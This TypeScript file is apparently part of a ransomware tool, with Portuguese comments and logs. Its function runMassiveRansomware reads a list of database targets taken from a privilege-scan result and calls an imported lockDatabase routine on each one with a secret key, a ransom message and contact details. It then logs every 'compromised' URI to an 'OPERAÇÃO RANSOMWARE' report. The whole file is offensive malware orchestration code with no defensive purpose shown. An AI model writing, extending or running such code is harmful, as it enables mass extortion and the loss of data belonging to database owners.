import fs from "fs/promises";
import chalk from "chalk";
import { lockDatabase } from "../utils/cryp.js";
import { getDatasFromResultPrivileges } from "../utils/getDatasFromResultPrivileges.js";

export async function runMassiveRansomware(
  keySecret: string,
  ransomMsg: string,
  contactInfo: string,
  inputFile: string,
  logFile: string,
): Promise<number> {
  // Verifica se o arquivo existe antes de começar
  try {
    await fs.access(inputFile);
  } catch {
    throw new Error(`Arquivo de entrada '${inputFile}' não encontrado.`);
  }

  const targets = await getDatasFromResultPrivileges(inputFile);
  const compromisedUris: string[] = [];

  console.log(
    chalk.yellow(`\n[*] Iniciando ataque em ${targets.length} alvos...\n`),
  );

  for (const target of targets) {
    try {
      // Chama a trava da DB
      await lockDatabase(target.uri, keySecret, ransomMsg, contactInfo);

      const logEntry = `REPO: ${target.repo} | URI: ${target.uri} | KEY_USED: ${keySecret} | DATA: ${new Date().toISOString()}`;
      compromisedUris.push(logEntry);

      console.log(chalk.green(`  [+] Sucesso: ${target.repo}`));
    } catch (err: any) {
      console.log(
        chalk.red(`  [-] Falha: ${target.repo} | Motivo: ${err.message}`),
      );
    }
  }

  if (compromisedUris.length > 0) {
    const header = `=== OPERAÇÃO RANSOMWARE ${new Date().toLocaleString()} ===\n`;
    // Usamos appendFile ou writeFile conforme sua preferência, aqui usaremos writeFile para o relatório da sessão
    await fs.writeFile(
      logFile,
      header + compromisedUris.join("\n") + "\n",
      "utf-8",
    );
  }

  return compromisedUris.length;
}
